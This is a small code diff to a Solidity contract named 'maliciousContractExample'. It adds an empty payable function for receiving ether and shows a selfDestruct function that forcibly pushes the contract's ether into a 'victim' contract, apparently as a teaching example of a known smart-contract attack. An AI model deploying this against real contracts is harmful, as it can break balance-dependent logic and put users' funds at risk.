@@ -20,8 +20,13 @@ contract maliciousContractExample {
    fallback() external payable {
   }
   
+  // Alternative to send ether to the contract
+  function sendEther() public payable {
+  }
+
+
   // 2. selfdestruct this contract with ether inside and transfer is to vulnerable contract
-  
+
   function selfDestruct(address victim) public {
   require(msg.sender == owner, "caller isn't owner");
   selfdestruct(payable(victim));
